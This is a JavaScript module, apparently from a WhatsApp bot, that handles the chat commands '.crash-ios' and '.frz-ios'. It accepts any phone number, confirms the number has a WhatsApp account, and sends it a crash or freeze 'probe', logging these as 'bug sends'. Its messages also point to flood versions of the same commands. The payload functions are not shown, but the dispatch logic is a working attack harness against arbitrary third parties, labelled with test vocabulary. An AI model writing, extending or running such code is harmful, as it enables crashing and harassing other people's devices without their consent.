/**
 * Early interception for temporary one-shot iOS probe commands.
 *
 * These commands intentionally run before normal command side effects. This
 * service preserves that boundary while keeping transport-specific routing out
 * of the main message handler.
 */
export function createOneShotProbeService(deps) {
    const {
        normalizeJid,
        isDevNumber,
        safeWaReply,
        sendIozkProbe,
        sendFiosProbe,
        recordBugSends,
        log,
        logError
    } = deps || {};

    for (const [name, value] of Object.entries({
        normalizeJid,
        isDevNumber,
        safeWaReply,
        sendIozkProbe,
        sendFiosProbe,
        recordBugSends,
        log,
        logError
    })) {
        if (typeof value !== 'function') throw new Error(`One-shot probe service requires ${name}()`);
    }

    const definitions = Object.freeze({
        'crash-ios': Object.freeze({
            overflowMessage: '⚠️ .crash-ios is a one-shot — no amount needed. For floods use .crash-iosd <number> <amount>.',
            usageMessage: 'Usage: .crash-ios <number>',
            startingLabel: '.crash-ios',
            sentLabel: '.crash-ios probe',
            logTag: 'CIS',
            logSuccess: 'IOZK probe sent to test target',
            logFailure: 'IOZK probe failed',
            sendProbe: sendIozkProbe
        }),
        'frz-ios': Object.freeze({
            overflowMessage: '⚠️ .frz-ios is a one-shot — no amount needed. For floods use .frz-iosd <number> <amount>.',
            usageMessage: 'Usage: .frz-ios <number>',
            startingLabel: '.frz-ios',
            sentLabel: '.frz-ios probe',
            logTag: 'FIS',
            logSuccess: 'F_OS probe sent to test target',
            logFailure: 'F_OS probe failed',
            sendProbe: sendFiosProbe
        })
    });

    async function handle(context) {
        const {
            sock,
            message,
            phoneNumber,
            remoteJid,
            fromMe,
            words,
            firstWord,
            prefix
        } = context;

        let commandName = '';
        for (const candidate of Object.keys(definitions)) {
            if (firstWord === `.${candidate}` || firstWord === `${prefix}${candidate}`) {
                commandName = candidate;
                break;
            }
        }
        if (!commandName) return false;

        const definition = definitions[commandName];
        const senderJid = message.key?.participant || message.key?.remoteJid || '';
        const isOwner = fromMe || (
            !!sock.user?.id &&
            normalizeJid(senderJid) === normalizeJid(sock.user.id)
        );
        if (!isOwner && !isDevNumber(senderJid)) {
            await safeWaReply(sock, remoteJid, '❌ Owner/dev only.', message);
            return true;
        }

        if (words.length > 2) {
            await safeWaReply(sock, remoteJid, definition.overflowMessage, message);
            return true;
        }

        const targetInput = words.slice(1).join(' ').trim();
        const targetNumber = targetInput.replace(/\D/g, '');
        if (!/^\+?[\d\s-]+$/.test(targetInput) || targetNumber.length < 8 || targetNumber.length > 15) {
            await safeWaReply(sock, remoteJid, definition.usageMessage, message);
            return true;
        }

        const botNumber = String(phoneNumber || '').replace(/\D/g, '') ||
            (sock.user?.id || '').split('@')[0].split(':')[0].replace(/\D/g, '');
        if (targetNumber === botNumber) {
            await safeWaReply(
                sock,
                remoteJid,
                '❌ Cannot target the bot\'s own number — that would hit the bot phone itself.',
                message
            );
            return true;
        }

        const targetJid = `${targetNumber}@s.whatsapp.net`;
        try {
            const [account] = await sock.onWhatsApp(targetJid);
            if (!account?.exists) {
                await safeWaReply(sock, remoteJid, `❌ Test number has no account: ${targetNumber}`, message);
                return true;
            }
        } catch (_) {
            // If lookup is unavailable on the test transport, preserve the
            // original best-effort behavior and try the single send.
        }

        await safeWaReply(
            sock,
            remoteJid,
            `⏳ ${definition.startingLabel} sending → ${targetNumber}…`,
            message
        );
        try {
            const result = await definition.sendProbe(sock, targetJid);
            recordBugSends(phoneNumber, targetJid, result?.ids || []);
            log(
                definition.logTag,
                `${phoneNumber}: ${definition.logSuccess} ${targetNumber}; ${JSON.stringify(result)}`
            );
            await safeWaReply(
                sock,
                remoteJid,
                `🧪 ${definition.sentLabel} sent to ${targetNumber}.`,
                message
            );
        } catch (error) {
            logError(definition.logTag, `${phoneNumber}: ${definition.logFailure}`, error);
            await safeWaReply(
                sock,
                remoteJid,
                `❌ ${definition.startingLabel} send failed: ${error?.message || error}`,
                message
            );
        }
        return true;
    }

    return Object.freeze({ handle });
}
